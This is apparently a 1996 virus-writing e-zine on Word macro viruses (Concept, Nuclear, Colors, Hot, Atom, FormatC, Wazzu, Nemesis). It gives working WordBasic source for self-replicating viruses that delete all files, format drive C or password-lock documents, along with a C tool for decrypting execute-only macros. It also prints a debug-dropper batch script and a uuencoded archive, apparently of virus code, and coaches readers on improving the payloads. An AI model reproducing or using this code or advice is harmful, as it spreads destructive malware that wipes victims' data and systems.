+If you take a look for the name, you can see the macro of all the macros
+included in the file. 
+The name can give you a idea of what they do,... but be careful !!     
+
+Now, you open the infected document and see what it does. nothing ... It's 
+normal !! Go to the menu TOOLS/MACRO. You can see the name of the 
+macro(the same you see with the hexeditor)
+
+IF you can use the Modify button, the macro is Execute-only... 
+		THEN go to the TOPIC 4.
+		Else you read the script and keep what you want...
+
+
+TOPIC 3: VIRUS EXAMPLES and what you can keep in mind
+======================================================
+
+I have studied some macro virus for you and I've commented them...
+
+      --------------------------------------------------------------
+
+4.1: Concept Virus :
+====================
+
+Also known by the Aliases of WW6Macro, WinWord.Concept, Word Basic Macro
+Virus (WBMV), Word Macro 9508 <MAC> and Prank Macro <MicroSoft named it
+Prank, to downplay the seriousness of the situation>.  This was the first
+MS Macro Virus to be detected by the Anti-Virus community, and the first
+Macro Virus to be considered in the wild, with infections spreading to the
+US, UK, France, Germany, Bulgaria, Canada, the Netherlands, Turkey, and
+Finland, and other Countries.
+
+A CONCEPT Infection is easy to notice, on the first execution of the virus
+infected document (on the first opening of the infected file) the
+MessageBox appears with digit "1" inside, and "Ok" button.  Also, simply
+checking the TOOLS/MACROS option to check loaded macros, the presence of
+concept is apparent by the appearance of these 5 macros :
+
+       AAAZFS *
+       AAAZAO *
+       AutoOpen
+       PayLoad *
+       FileSaveAs
+
+The infection routine of this virus : 
+
+	'see if we're already installed 
+	For i = 1 To iMacroCount
+		If MacroName$(i, 0, 0) = "PayLoad" Then
+			bInstalled = - 1
+		End If
+		If MacroName$(i, 0, 0) = "FileSaveAs" Then
+			bTooMuchTrouble = - 1
+		End If
+	Next i
+	If Not bInstalled And Not bTooMuchTrouble Then
+		'add FileSaveAs and copies of AutoOpen and FileSaveAs.
+		'PayLoad is just for fun.
+		iWW6IInstance = Val(GetDocumentVar$("WW6Infector"))
+		sMe$ = FileName$()
+		sMacro$ = sMe$ + ":Payload"
+		MacroCopy sMacro$, "Global:PayLoad"
+		sMacro$ = sMe$ + ":AAAZFS"
+		MacroCopy sMacro$, "Global:FileSaveAs"
+		sMacro$ = sMe$ + ":AAAZFS"
+		MacroCopy sMacro$, "Global:AAAZFS"
+		sMacro$ = sMe$ + ":AAAZAO"
+		MacroCopy sMacro$, "Global:AAAZAO"
+
+
+
+At the end of each Macrocopy, you put ,1 and you have Execute-Only macros... 
+	just an idea :)
+
+      --------------------------------------------------------------
+
+4.2: Nuclear :
+==============
+
+Known widely as Winword.Nuclear, Wordmacro-Nuclear and Wordmacro-Alert.
+This virus was the first WordMacro virus to infect <or at least to attempt
+to infect> both data/documents <Word Documents .DOT and .DOC> as well as
+executables <.COM/.EXE/NEWEXE>
+
+In truth, it is 2 viruses, a macro virus which alters the Operating
+Environment of WORD, and an executable file infector <as well as a system
+file deleter>.  This makes NUCLEAR the first Macro Virus to also
+incorporate, or at least try to incorporate a classic File Infector Virus.
+This virus is actually quite ineffective in the destructive sense, detailed
+later in this document. The infected documents contains the following nine
+Macros...
+
+       AutoExec
+       AutoOpen
+       FileSaveAs
+       FilePrint
+       FilePrintDefault
+       InsertPayload   *
+       Payload         *
+       DropSuriv       *
+       FileExit
+
+which get copied into the GLOBAL Macro List.
+
+General detection of NUCLEAR is easy, simply view the macros listed under
+the Macros command under the Tools Menu.  If Macros "InsertPayload",
+"Payload", and "DropSuriv" are listed, then you'll likely have a NUCLEAR
+infection. <unless you named legitimate macros with the same names... :) >
+NUCLEAR hides itself from detection, by disabling the "PROMPT FOR CHANGES
+TO NORMAL.DOT" option.  Changes are made, and the user doesn't notice
+anything.
+
+
+The "InsertPayload" Macro will cause the following text to be added to the
+end of printouts when printing documents. Every 12th printout will have the
+following text added...
+
+       And finally I would like to say:
+       STOP ALL FRENCH NUCLEAR TESTING IN THE PACIFIC!
+
+which is appended to the file after the command to print is issued but
+prior to the actual printing. FAX's sent via a FAX Print Driver will also
+be affected, this much I know first hand.  From testing, I came to the
+realization that some Vx putz will start messing with my outgoing faxes
+behind our backs.
+
+Another included Macro, is "Payload" which tries to delete IO.SYS,
+MSDOS.SYS and COMMAND.COM on April 5th. It is inaffective, as WordBasic
+can't reset the attributes of a file which has the System attribute set.
+It has been noted that a variant that does work is being circulated.
+
+The Second part of the Nuclear Virus is the executable infector.  The
+DropSuriv Macro checks system time, and will attempt to drop the file
+infector between 17:00/18:00.  However, the routine is flawed, and
+shouldn't work on any system.  <fails due to a syntax error - not closed IF
+statement, which makes this payload never executed> If DropSuriv DID work
+properly, it would search for the standard DOS util DEBUG.EXE, if found,
+the macro drops PH33r.SCR & EXEC_PH.BAT.  The Bat File is executed, and
+then the hex dump file PH33r.SCR is converted from a DEBUG script into an
+executable, and is in turn executed.  Later, the .SCR and the .BAT files
+are deleted to cover its tracks.  The File infector then hooks INT 21h and
+writes itself at the end of COM/EXE/NewEXE files.  <however, the memory is
+released once this DOS task is completed, includes the memory resident
+virus Ph33r> Unconfirmed reports state that a NUCLEAR infected Macro with a
+fully operational DropSuriv Macro exist.
+
+The following text strings are in the executable infector...
+
+       =Ph33r=
+       Qark/VLAD
+
+The virus group VLAD publish it in the issue n4. (I think the entire version of 
+this virus So, found them on the Net.)
+      --------------------------------------------------------------
+
+4.3:  Colors:
+=============
+
+Colors, is the first WINWORD Macro Virus that could be called cute <IMHO>.
+This Virus has the noticeable ability to alter the Windows colors settings.
+  If iModEvery = (iEvery - 1) Then          
+		sColors$(0) = "Background"
+		sColors$(1) = "AppWorkspace"
+		...
+		sColors$(19) = "InactiveTitleText"
+		sColors$(20) = "ButtonHilight"
+		
+	 For i = 0 To 20
+	       SetProfileString("colors", sColors$(i), Str$(Int(Rnd() * 256)) + " "
+		   + Str$(Int(Rnd() * 256)) + " " + Str$(Int(Rnd() * 256)))
+	 Next i
+  End If
+
+Mac Word is immune to the payload <the system colors attack> but is still
+susceptable to the infection mechanism, which will attack documents.
+Detection of infections is easy, as infected documents appear with the
+template icon, rather than the usual document icon.
+
+Commonly known as Rainbow or WordMacro.Colors, this virus was freely posted
+to usenet newsgroups on October 14th, 1995. The Colors Virus will infect
+the global template <usually NORMAL.DOT> upon opening of an infected
+document.  An infected document contains the following macros:
+
+       AutoOpen
+       AutoClose
+       AutoExec
+       FileNew
+       FileExit
+       FileSave
+       FileSaveAs
+       ToolsMacro, and other macros.
+
+All Macros included in COLORS are Execute-Only, and cannot be viewed or
+edited by MicroSoft Word.  If normal "clean" macros with the same names
+existed prior to infection, they will be overwritten by COLORS.
+
+The AutoExec Macro of COLORS is an EMPTY Macro, possibly designed to defeat
+any ANTI-MACRO-VIRUS schemes developed by the AV community.  It
+accomplishes this by overwriting a "CLEANING/SCANNER" AutoExec Macro with
+COLORS empty one, effectively making the AV Scanner/Cleaner useless. 
+
+COLORS will also enable AutoMacros in case you were smart and disabled
+them!  It will also disable the MS Word's Prompt to save changes to
+NORMAL.DOT.  
+
+ [      OutilsOptionsEnregistrement .InviteGlobalDot = 0 ]  Very interesting
+
+
+COLORS is crafty, as it can spread without the use of AUTO macros...  thus
+defeating the DISABLE AUTOMACROS Feature.  It does so via the Macros:
+
+       File/New
+       File/Save
+       File/SaveAs
+       File/Exit
+       Tools/Macro
+
+COLORS will infect NORMAL.DOT whenever a user chooses any of the above
+functions.  It also has limited stealth ability, earning it the title of
+being the first WINWORD STEALTH MACRO VIRUS.  It accomplishes it's stealth
+actions, by hiding itself from the active listing, since attempting to view
+active macros would run the COLORS infected Tools/Macro, thus hiding it's
+own presence while simultaneously infecting your system. 
+ 
+ [   MacroTools .Name = sNames$(i), .Print = 1, .Delete    ] Good !!!
+
+The COLORS virus will keep track of infections via a counter, named
+"countersu", which can be found under the [Windows] section of the WIN.INI
+file.  Whenever an infected macro is executed, the counter is incremented
+by a count of one.  It quickly adds up, when you consider how much you
+OPEN, CREATE, SAVE, EXIT, and CLOSE documents.  When the increment counter
+reaches 299, and every 300th execution thereafter, COLORS will be
+triggered.  COLORS will then make changes to the system colors setup,
+including text, background, borders, buttons, etc., using randomly
+determined colors.  The new color scheme becomes apparent to the user
+during the next session of Windows.
+
+Colors ability to spread without the use of AutoExecute Macros, and its use
+of Advanced Stealth techniques signals a new level of MACRO virus
+technology.  <Hiding itself from view when you actively look for it defines
+STEALTH in my book, since it evades detection> It also adds fuel to the VxD
+argument, as an on access scanner could prevent infection by this type of
+stealthy virus.
+
+You have the complete disassemblie in the previous issue.. so download it...
+      --------------------------------------------------------------
+
+4.4: DMV:
+=========
+
+Commonly known as WordMacro.DMV, DMV is an unremarkable TEST Virus,
+possibly the first to be created using the WORDBasic Language.  Joel
+McNamera wrote it in the fall of 1994, as a real time TEST for some MACRO
+Virus Theories.  The Virus was kept under wraps, and a detailed paper was
+published.  This TEST virus was only released, as an educational aid, after
+the CONCEPT virus was discovered.  DMV isn't a threat to anyone, as it
+announce itself upon infecting the system.
+
+Nothing to say, it's an old virus. and now, all the technique used was 
+detected by most AVX.
+      --------------------------------------------------------------
+
+4.5: HOT:
+=========
+
+Also known as WORDMACRO HOT, WinWord.Hot.
+
+Not the most ingenious of the Macro Virus Family, it's biggest kick, is the
+ability to wait or sleep for awhile <up to 14 days> and then delete a file.
+WordMacro/Hot appears to be the first Word macro virus written in Russia.
+It was found in the wild in Russia in January 1996.
+
+Infected documents contain four execute-only macros:
+
+	AutoOpen
+	DrawBringInFrOut
+	InsertPBreak
+	ToolsRepaginat.
+
+MacIntosh Word Users will notice HOT, by examining the icon of the file...
+infected documents appear with the template icon, normal documents appear
+with the normal document icon.
+
+NOTE: WordMacro/Hot appears to be the first macro virus to use external
+functions, allowing Word macros to call any standard Windows API call.
+This makes the spreading function Windows 3.x specific, preventing Word for
+MAC and Word 7 for Win '95 from spreading the Virus.  An error dialog will
+be displayed under Microsoft Word 7.0.
+
+	Unable to load specified library
+
+HOT activates automatically via it's AutoOpen Macro <assuming no attempt to
+disable AutoMacros has been made> adding a line LIKE...
+
+	QLHot=34512
+
+to Ms Word for Windows 6's WinWord6.INI file, which acts as a counter
+recorder system, setting a date 14 days in the future for payload
+activation.
+
+HOT then copies the included macros to the Global Template, NORMAL.DOT
+usually, revising their names...
+
+	AutoOpen          ==>   StartOfDoc
+	DrawBringInFrOut  ==>   AutoOpen
+	InsertPBreak      ==>   InsertPageBreak
+	ToolsRepaginat    ==>   FileSave
+
+A listing of the currently loaded macros in this infected environment will
+reveal the names in the right list.  Loading another infected document
+<actually a template> will add the left list to the macro list plus the
+right list.  NOTE:   Macros have been saved with the 'execute-only'
+feature, which means  that a user can't view or edit them.
+
+A clean <AutoMacros disabled> WORD environment will produce the left list
+when viewing an infected document.
+
+HOT's FileSave macro cause the virus to randomly decide within 1-6 days
+from the infection date to activate whenever an effort to open files is
+made.  Upon activation, a document will have it's contents deleted, by
+opening it, slecting the entire contents, delting them, and closing the
+document, saving it in it's now empty state.
+
+Users with c:\DOS\EGA5.CPI should be protected from this macro, as the
+author included a check for this file as a protective measure, noted in the
+source code as follows:
+
+  '---------------------------------------------------------------
+  '- Main danger section: if TodayNo=(QLHotDateNo + RndDateNo) ---
+  '- and if File C:DOSega5.cpi not exist (not for OUR friends) ---
+  '---------------------------------------------------------------
+
+HOT's InsertPBreak Macro inserts a page-break in current documents, which
+is used as a sign of a document already being infection by HOT.
+
+NOTE:  WordMacro/Hot relies on the existence of KERNEL.EXE
+
+I can see this macro, if you have it, please send it to the mag.... thanks
+
+      --------------------------------------------------------------
+
+4.6: MS WORD 2/MS WORD 6.x MACRO TROJAN WEIDEROFFEN:
+====================================================
+
+This is a new MACRO Trojan, <that's been around for 2 years> that goes by
+the alias WinWord.Weideroffnen.  It is technically a WinWord 2 infected
+document, that works eqwually well under MS WORD 6.x.  It intercepts
+AutoClose, and attempts to play tricks with boot-up file AUTOEXEC.BAT. 
+
+I haven't seen this macro virus, so I don't know...
+
+      --------------------------------------------------------------
+
+
+4.7  WORDMACRO ATOM / ATOMIC
+=============================
+
+This is a new Macro Virus, found in February 1996, which works along the
+same general ideas as the original Concept virus. The WordMacro/Atom virus
+is not known to be in the wild.
+
+The differences, when compared to the Concept Virus, follows:
+
+       - All the macros in this virus have been marked EXECUTE ONLY,
+	 making them encrypted
+       - Replication occures both during file openings, and file saves.
+       - Atom comes with 2 destructive payloads
+
+On December 13th, it's first point of activation occures.  It will attempt
+to delete all files in the current file directory.
+
+The second activation, password protects documents, restricting the users
+access to their own documents.  This happens when the system clock seconds
+counter equals 13, and a File/Save As command is issued.  The passowrd
+assigned to the documents is ATOM#1.
+
+If the user disables AUTOMACROS, Atom will be unable to execute and spread
+to other documents.  Enabling the Prompt To Save NORMAL.DOT will prevent
+Atom from attacking and infecting the NORMAL.DOT file.
+
+Here is the source :
+	Keep in mind the idea of put a passwd in a file, not a bad idea.... 
+Macros: Atom
+
+Sub MAIN
+On Error Goto KillError
+If Day(Now()) = 13 And Month(Now() = 12) Then
+	Kill "*.*"
+End If
+KillError:
+End Sub
+
+
+
+Macros: AutoOpen
+
+Sub MAIN
+Dim FN$
+FN$ = FileName$()
+On Error Goto ErrorInfectGlobalTemplate
+If (CheckInfected = 0) Then
+	MacroCopy FN$ + ":FileSaveAs", "FileSaveAs", 1
+	MacroCopy FN$ + ":FileOpen", "FileOpen", 1
+	MacroCopy FN$ + ":AutoOpen", "AutoOpen", 1
+	MacroCopy FN$ + ":Atom", "Atom", 1
+	SaveTemplate            
+End If
+Call Atom
+ErrorInfectGlobalTemplate:
+End Sub
+
+Function CheckInfected
+CheckInfected = 0
+If (CountMacros(0) >= 4) Then
+	For I = 1 To CountMacros(0)
+		If (MacroName$(I, 0) = "Atom") Then
+			CheckInfected = 1
+		End If                  
+	Next I             
+End If
+End Function
+
+
+
+Macros: FileOpen
+
+Sub MAIN
+On Error Goto InfError
+Dim dlg As FileOpen
+GetCurValues dlg
+Dialog dlg
+FileOpen dlg
+MacroCopy "AutoOpen", Dlg.Name + ":AutoOpen", 1
+MacroCopy "FileSaveAs", Dlg.Name + ":FileSaveAs", 1
+MacroCopy "FileOpen", Dlg.Name + ":FileOpen", 1
+MacroCopy "Atom", Dlg.Name + ":Atom", 1
+FileSaveAs .Format = 1
+InfError:
+End Sub
+
+
+
+Macros: FileSaveAs
+
+Sub MAIN
+Dim dlg As FileSaveAs
+GetCurValues dlg
+Dialog dlg
+If (Dlg.Format = 0) Or (Dlg.Format = 1) Then
+	MacroCopy "FileSaveAs", WindowName$() + ":FileSaveAs", 1
+	MacroCopy "AutoOpen", WindowName$() + ":AutoOpen", 1
+	MacroCopy "FileOpen", WindowName$() + ":FileOpen", 1
+	MacroCopy "Atom", WindowName$() + ":Atom", 1
+	Dlg.Format = 1
+End If
+If (Second(Now()) = 13) Then        ] easy... to block a document
+	Dlg.Password = "ATOM#1"     ] a idea why not put a randomize passwd ?
+End If  
+FileSaveAs dlg
+End Sub
+
+      --------------------------------------------------------------
+
+4.9  FORMATC MACRO TROJAN
+==========================
+
+Also known as WORDMACRO.FORMATC, and FORMAT.C.Macro.Trojan
+
+The FORMATC Macro Virus, isn't even a virus, as it DOES NOT SPREAD.  This
+makes it another MACRO TROJAN.  This Trojan contains only one macro,
+AutoOpen, which will be executed automatically when a document is opened.
+The Macro AutoOpen, is READ ONLY, making it encrypted, and unreadable and
+editable.  It is visiable in the Macro List.
+
+When FORMATC is executed, "triggered", it will  run a dos session, in a
+minimized DOS box.  It will run an Unconditional Format of the C drive.
+   
+Here is the macro (Basic) but deadly...
+Sub MAIN
+	sCmd$ = "echo y|format c: /u"
+	Shell Environnement$("COMSPEC") + "/c " + sCmd$, 0
+End Sub
+
+If you want to execute DOS command, you have here a hint on how to do it.
+
+4.10  WORDMACRO WAZZU
+=======================
+WordMacro/Wazzu consists of a single AutoOpen macro; this makes it language
+independent, ie. this macro virus is able to infect localized versions of
+Word as well as the english Word.
+
+It's inserted in your text the word "Wazzu" ... why not....
+Nothing more to said, classic... 
+
+Sub MAIN
+	On Error Goto errCaught
+		
+	FileSummaryInfo .Update
+	Dim dlg As FileSummaryInfo
+	GetCurValues dlg
+
+	fileMacro$ = dlg.Directory + "\" + dlg.FileName + ":autoOpen"
+	globMacro$ = "Global:autoOpen"
+	MacroFile$ = UCase$(Right$(MacroFileName$(MacroName$(0)), 10))
+
+	If MacroFile$ = "NORMAL.DOT" Then
+		MacroCopy globMacro$, fileMacro$
+		FileSaveAs .Format = 1
+	Else
+		MacroCopy fileMacro$, globMacro$
+	End If
+
+	Payload
+
+Goto bye
+errCaught:
+
+bye:
+	On Error Goto 0
+
+End Sub
+
+Sub Payload
+	For i = 1 To 3
+		If Rnd() < 0.2 Then
+			RndWord
+			SelectCurWord
+			selWord$ = Selection$()
+			DeleteWord
+
+			RndWord
+			Insert selWord$ + " "
+		End If
+	Next
+
+	If Rnd() < 0.25 Then
+		RndWord
+		Insert "wazzu "  <-------------------here's the payload
+		StartOfDocument
+	End If
+
+End Sub
+
+Sub RndWord
+	FileSummaryInfo .Update
+	Dim dlg As DocumentStatistics
+	GetCurValues dlg
+
+	wordNum = Int(Rnd() * Val(dlg.Words))
+	StartOfDocument
+	WordRight wordNum
+End Sub
+
+
+TOPIC 5: HOW TO DO WITH EXECUTE-ONLY MACROS
+============================================
+
+Easy, when you copy a macro with the option 1, Microsoft Word encrypts the 
+source of the macro, so when you look at the file, you can't see it....
+But, the encryption they use is stupid :))) an XOR value... so the only 
+difficult thing, it's to find the XOR key...you must scan the file 
+and the Xor value is included...
+
+I explain the method :
+	Locate the "real" filename of the document within the document,
+	A few bytes after the end of the name, there is a "U", the byte 
+		immediately following is the ... XOR value to use.
+	Now to find the beginning of the macros are usually at B89h or 
+		at 1509h. To locate, there is always the sequence 
+		A5h C6h 41h then a byte and then the XOR value....
+
+This is the standard method, you must know that each macro has a specific XOR 
+value.. when you look for the filename, you will find as many U's as you 
+have macros in the document.
+
+I encountered some difficulties when the document is composed of encrypted macros 
+and normal macros... In this case, try to delete some macros and decrypt...
+
+I can give you a little C source to help you. This source uses a brutal method, so you will have 
+1 macro readable by file.... try with the COLORS macro (last issue). I know 
+that the soft. functions well.
+- --><-cut here---------------------------------
+/*********
+  (c) AURODREPH Productions 04/1996
+**********/
+
+#include "io.h"
+#include "stdlib.h"
+#include "stdio.h"
+#include "conio.h"
+#include "process.h"
+#include "fcntl.h"
+#include "string.h"
+#include "sys\stat.h"
+
+void main (void)
+ {
+	char Name[13];
+	char Target[13];
+	unsigned char *Buffer;
+	int Handler, Handler1;
+	unsigned int Offset;
+	unsigned long Length = 0;
+	int point, max, trouve, cledec, debmac, decfin;
+	int stop,nbr,positcle,nbrmac,i;
+
+	clrscr();
+	printf (" ******************************************************************\n");
+	printf (" *                                                                *\n");
+	printf (" *               DECRYPT WORD 6.0 MACROS saved                    *\n");
+	printf (" *                 with the option Execute-only                   *\n");
+	printf (" *                                                                *\n");
+	printf (" *                                                                *\n");
+	printf (" *       --- ,This file works only with files < 32 Ko. ----       *\n");
+	printf (" *     <*****}===============-                                    *\n");
+	printf (" *      (z)  ' AURODREPH Productions 04/1996                      *\n");
+	printf (" *                                                     ver 0.666B *\n");
+	printf (" ******************************************************************\n");
+	printf ("\n"); printf("\n");
+	printf ("Name of the input file     = ");
+	scanf ("%12s",Name);
+	printf ("\n");
+	printf ("Name of the output file    = ");
+	scanf ("%12s",Target);
+	printf("\n");
+	printf ("Number of crypted macros   = ");
+	scanf ("%d",&nbrmac);
+	printf("\n");
+	if (nbrmac > 50 ) {exit (0);}
+	Handler = open (Name, O_BINARY | O_RDONLY , S_IREAD);
+	if (Handler == -1)
+		{printf ("The input file doesn't exist.\n"); exit(0);}
+
+	Length = (unsigned long) lseek(Handler, 0, SEEK_END);
+	lseek (Handler,0,SEEK_SET);
+	Buffer = (unsigned char *) malloc((unsigned) Length);
+	if (Buffer == NULL) printf ("Fail memory allocation.\n");
+	if (read(Handler, Buffer, (unsigned) Length) != Length)
+		{printf ("The size of the file is > 32 ko)\n");
+		 printf ("Try to remove some macros with WORD....\n");
+		 exit (0);}
+
+	point = 0;
+	max = strlen(Name);
+	trouve = 1;
+	cledec = 0x00;
+	debmac = 0x00;
+	stop = 0;
+	for (i=0; i<max;i++)
+		{if ((Name[i]>= 0x61) & (Name[i]<= 0x7A))
+			 { Name[i] = Name[i] & 0xDF ;}
+		};
+
+	for (Offset = 0x0000; Offset < Length; Offset++)
+	 {
+	  if ((Buffer[Offset] == Name[point]) && (stop !=1))
+			{
+			for (point = 1; point <= (max-1); point++)
+				 {if (Buffer [Offset+point] == Name[point])
+							{ trouve = trouve+1; }                                                  }
+							else trouve = 1;
+				 };
+			}
+	  if (trouve == max) {stop = 1;}
+	  if ((trouve == max) && (Buffer[Offset] == 0x55))
+			{cledec = Buffer[Offset+1];
+			trouve = 0;
+			Buffer [Offset+1] = 0x00;
+			positcle = Offset;
+			}
+	  point = 0;
+	 };
+if (cledec == 0x00)
+	{printf (" Don't find the decrypted key... \n"); exit (0);}
+	else printf ("Decrypted Key for the macro n 1 = %x \n", cledec);
+
+	for (Offset = 0x0000; Offset < Length; Offset++)
+	 {
+	  if (Buffer[Offset] == 0xA5)
+	  {if ((Buffer [Offset+1] == 0xC6) || (Buffer [Offset+1] == 0xC4))
+		  {if (Buffer [Offset+2] == 0x41)
+			  {if (Buffer [Offset+4] == cledec)
+					{debmac = Offset+3;
+					}
+			  }       }       }      };
+if (debmac == 0x00)
+		{for (Offset = 0x0000; Offset < Length; Offset++)
+				 {
+				 if (Buffer[Offset] == cledec-1)
+					{if (Buffer [Offset+1] == cledec)
+					       {debmac = Offset;  }
+						}        };             }
+if (debmac == 0x00) { printf (" Don't find the beginning of the macro\n");      exit(0);}
+
+
+for (nbr = 1 ; nbr <= nbrmac ;nbr++)
+{
+if (nbr != 1)
+	{
+	printf ("\n");
+	printf (" I decrypt the macro n %d \n", nbr);
+	Offset = positcle+24;
+	 if (Buffer[Offset] ==  0x55)
+			{cledec = Buffer [Offset+1];
+			Buffer [Offset+1] = 0x00;
+			positcle = Offset;
+	   printf ("Decrypted Key for the macro n %d = %x \n", nbr,cledec);
+				}
+			else
+		    {printf (" Don't find the decrypted key ....\n");}
+	}
+Offset = debmac;
+point = 0;
+decfin = 1;
+stop = 1;
+printf ( " I work ");
+	do
+	{ if (stop == 400) {printf ("."); stop = 1 ;}
+	  Buffer[Offset+point] ^= cledec ; /* decryptage par XOR */
+
+	  if (Buffer [Offset+point] == 0x64)
+				{Buffer [Offset+point+1] ^= cledec;
+				if (Buffer [Offset+point+1] == 0x1a)
+					{Buffer [Offset+point+2] ^= cledec;
+						if (Buffer [Offset+point+2] == 0x1b)
+							{Buffer [Offset+point+3] ^= cledec;
+							if (Buffer [Offset+point+3] != 0x64)
+								 {decfin = 0;
+								 debmac = Offset+point+3;
+								 Buffer [Offset+point+3] ^= cledec;
+								 }
+							else
+								 Buffer [Offset+point+3] ^= cledec;
+							}
+						else
+							Buffer [Offset+point+2] ^= cledec;
+				}
+				else
+					 Buffer [Offset+point+1] ^= cledec;
+		}
+	if ((Offset+point) == Length) {decfin = 0;}
+
+	stop = stop + 1;
+	point = point + 1;
+	}
+	while ( ( decfin != 0) );
+printf ("\n");
+printf (" End of decrypting the macro n %d \n", nbr);
+};
+
+	_fmode= O_BINARY;
+
+	Handler1 = creat(Target, S_IFMT | S_IREAD | S_IWRITE);
+	write (Handler1, Buffer,(unsigned) Length);
+
+	close (Handler1);
+	close (Handler);
+	printf ("\n"); printf ("\n");
+	printf (" END ... \n");
+	printf ("\n");
+	printf (" The decrypted file is  %s .\n", Target);
+}
+
+- ------------------><--- cut here ------------------------------------
+
+
+      --------------------------------------------------------------
+
+      This FAQ is Copyright (z) 1996
+    ______            _____            _____                    _____      
+   /  __  \  __  __  /  __ \  _____   /  __ \    _____ ______  /  __ \  ___ _
+  /  /_/  / / / / / /  / / / /  __ \ /  / /  \  / __ //  ___/ /  / / / /  // \
+ /  / /  / / /_/ / /  /_/ / /  /_/ //  /_/   / / /_///  _/_  /  /_/ / /  _~  /
+/__/ /__/,/_____/ /__/ \  > \_____//________/ /_//_//_____/ /  ____/ /__//__/
+====*****{=========-====\/======[ The DROW of UNDERDARK ]===\_/===============
+	 '
+
+
+MicroFuck (tm), Windows, Word, EXCEL are Copyright (z) 1995-96 MicroFuck Corp.
+	      All rights reserved to the virus makers...
+       --------------------------------------------------------------
+
+P.S : sorry but i don't use a ENGLISH version of Word, so some names of the 
+	instruction could be incorrect !!! Just use the F1 option and find the 
+	nearest name....
+
+- ---------------------------------------------------------------------------
+In the next issue, you will find :
+		the first EXCEL macro virus...
+		and all the macro virus I can study... so, if you have some
+		new macro virus, PLEASE MAIL THEM TO THE MAG EDITOR AT:
+		101546.2222@compuserve.com!!!!!
+
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.3ia
+Charset: cp850
+Comment: Reviewed by Editor
+
+iQB1AwUBMU7V6JUWxCqisaIxAQFfqwL/dYW3uRcDWWiXMedAt1sGB6KWmsJE1H00
+BnWTvqJ2uCX/mhLWAVDs1Yqn6maBGfF3IlZ7g839gNEhYZpQlgXMRXNUnebMxtyf
+ljhbEUGb1WKC+5WXbak4cfaYZVrNGilA
+=oNsc
+-----END PGP SIGNATURE-----
+-----BEGIN PGP SIGNED MESSAGE-----
+
+   		         File 009 
+      --------------------------------------------------------------
+
+		  Macro.Word.Xenixos (Nemesis)
+                         Published By
+		             ,
+			<****{=============-
+			     ' AuRoDrEpH, the Drow
+      --------------------------------------------------------------
+It is encrypted virus. It contains the macros:
+
+Drop, Dummy, AutoExec, AutoOpen, Datei oeffnen, ExtrasMakro, DateiBeenden, 
+DateiDrucken, DateiSpeichern, DateiSpeichernUnter, DateiDruckenStandard.
+
+In some cases it sets the password "xenixos" for infected documents, 
+displays the message:
+
+ Diese Option ist derzeit leider nicht verf gbar.
+ Fehler    (Translation: Error!  This option is not available right now.)
+
+While printing the documents it appends:
+
+ Brought to you by the Nemesis Corporation,  1996
+
+On 1st of may the virus writes the string to the AUTOEXEC.BAT file:
+
+ @echo j|format c: /u >nul
+
+This virus also launches "Neurobasher.b" multipartite virus. To do that the 
+virus creates the C:\DOS\SCRIPT.SCR file, and writes hexadecimal dump 
+of that virus into there. Then the virus creates the C:\DOS\EXEC.BAT file, 
+and writes the strings into there:
+
+ @echo off
+ debug < script.scr>nul
+ rem debugger.com
+ echo @c:\dos\debugger.exe>>c:\autoexec.bat
+ del c:\dos\script.scr
+ del c:\dos\exec.bat
+
+Then the virus executes that file. As the result DEBUG.EXE creates the
+DEBUGGER.EXE file, and C:\AUTOEXEC.BAT has new string at its end:
+
+ @c:\dos\debugger.exe
+..........................................................................
+section 1/1   file nemesis.zip   [ Wincode 2.6.6 ]
+
+begin 644 nemesis.zip
+M4$L#!!0``@`(`!*OD"`@*(M8+@(``"T&```+````4D5!1%]/4BY$246%E$MO
+MFT`0Q\]$RG<83K4C2ENIBA2D'A+94CC`KIQ6Z17!6EX56`MP'+=?OC/[*(1'
+M.K:LA9W??QX[:X"AA6B0,I\6,#%ZF=C=ZZLQ9_9\LYX8;J9LBMH]I_HNBQX#
+MU$5D1A=0Q!GGG,6Q?I=22B-2U^$C0YL#S)*,6-]U852H31*F'(%(8MBE_IA*
+MWT*:LA'#\#^<\>76:)U0O*4D+65.$C&,J#<#Q&9K@P$61?BLT)<G/`@5/D21
+M37),]8.3(A:%08!))CYB^!3Y\Z$L14=/I@M+\*SB&"OS?3<.VBU8B&CJ,SC&
+MP6]L&F-@N"'[\VUD'V$V%^CUL*_X&U,JG/4CK;T^P/UIIS;-]O@8OE.7ZR-.
+MI\X0Q5!I,-+.OA\$;!IUIO54J[\`D+#$*:&6#XS!5.XY:^$ARW\!SOS\3+@K
+M',O>8J#V#^_?&]9B&#LT]Q3TG=+&Z(FE#(87>#K#8$]9^[#>D-83P%)_&7:X
+MIL&-/[?3LXCV-)O[<P$$X1](G_Y(9`M9DQ_DBX`S=C17U5&UH@"UATC[>5XM
+M*M'*-NQ>.X\WHA5UEW52U>33X9E66=XH>)'-J85TFVR?XB=8_12U?%7M^OK*
+M"=QH@:PL-52(O+D<.XRD\=ZM#0N5>QED>4=)&=G5@X`\:\3^5`8:-Z]EO1<Y
+M:A#M>2"K2A0RZ\H+G`^BAHLZ@3KB@HB]+(7NP)H:L/J]AOL?.[;9;?DC\$85
+MIYQJ:N'SUT]?[NYN_P)02P,$%``"``@`ZZV0()Z%081Y`0``N@(```P```!.
+M14U%4TE3.2Y46%1MD>%*PT`,Q[\7^@YA#%Q1I)U.$%305:7@IFSB]UN;KH?K
+M9:0IND?RT7P+[VX;J^+=ER/Y)__++Q.5,T&J!'7*;?Z.9B[*%(J+,`B#>;N`
+MR6TV#8-G`_?,Q###IJT1IO@I7H&Y:#)]N(;>F.JU$KW0*RV;7AA\:&-O(^RS
+M\6<<#^/S.+&9%Z92KW"J:O2YV6PX3GU<&WFUK7WTCJE=5@)"L*$6%AN0RCG7
+MV.@&QL1K8N7<3^`KN;R\<`U4TWP0%ZY^7'%_D`SC"(YW[S@YO)-N?'1X=_5)
+M5S^*W+Q3>M-^GD>4W11SL;]>]@=[%"?0'<]6927LRJYNH`/EM4(#+VKS1,K3
+M?M!YI9&S>LVZ1DZ_2]5:R+#?A)6NO/3_95@;^P4R!0XFRG)$HXP,H@BNX"SV
+M9K:7/;\A=W&>]K:*!VU2RFUG([`]1TMR:W#\T11`)10[P>FV)#,-LAM_CROZ
+M&S_8;C/I]Z*5KDW'HQ'%\M<E*QV(>VMO883!#U!+`P04``(`"`#6K9`@E9KO
+M<IT!``#S`@``#````$Y%345325,X+E185%U186O;0`S];O!_$"&PF)5B9^N@
+MHRMT=EL,35;2TN\76[&/VJ>@DVGRD_;3^B]Z9Z>+E[LO0GI/3WI:J((),B6H
